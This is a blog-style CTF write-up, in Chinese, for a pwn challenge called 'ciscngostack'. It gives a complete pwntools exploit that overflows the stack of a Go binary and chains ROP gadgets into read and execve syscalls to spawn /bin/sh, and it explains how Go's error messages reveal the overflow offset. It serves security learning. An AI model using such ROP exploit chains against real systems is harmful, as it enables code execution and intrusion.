---
layout: post
title: "ciscngostack"
date: 2024-6-17
tags: [pwn]
comments: true
author: gbeefee

---

单纯的ROP，当时所有gadget都找齐了，因为缓冲区长度，没做出来。后面看其他wp知道go语言溢出会报错给返回地址

先放完整exp：

```python

from pwn import *

p = process("./gostack")

context.log_level = 'debug'

# ROPgadget
rdi = 0x4a18a5 # pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret
rsi = 0x42138a # pop rsi ; ret
rax = 0x40f984 # pop rax ; ret
rdx = 0x4944ec # pop rdx ; ret
ret = 0x40201a # ret
syscall = 0x4616C9 # syscall ; ret
bss = 0x5633a0 

off = 456

# read调用
payload = b'\x00'*off + p64(0) \
        + p64(rax) + p64(0x0) \
        + p64(rdi) + p64(0) + p64(0)*5 \
        + p64(rsi) + p64(bss) \
        + p64(rdx) + p64(0x30) \
        + p64(syscall)
# 将addr处的字符串作为参数执行sys-execv
payload+= p64(rax) + p64(0x3b) \
        + p64(rdi) + p64(bss) + p64(0)*5 \
        + p64(rsi) + p64(0) \
        + p64(rdx) + p64(0) \
        + p64(syscall)

p.sendlineafter(b'Input your magic message :',payload)

p.recvuntil(b'Your magic message :')
p.sendline(b'/bin/sh\x00')

p.interactive()

```

保护，只开了NX，根据名字大概率是栈溢出

![](https://github.com/gbeefee/gbeefee.github.io/blob/main/images/ciscngo/01.png)

因为是用go语言编写的，ida几乎是看不到什么东西了，但是go报错会提示错误地址

![](https://github.com/gbeefee/gbeefee.github.io/blob/main/images/ciscngo/02.png)

算一下长度

![](https://github.com/gbeefee/gbeefee.github.io/blob/main/images/ciscngo/03.png)

然后就是获取gadget，ropper查一下，发现特别多，要的都有，就不贴了。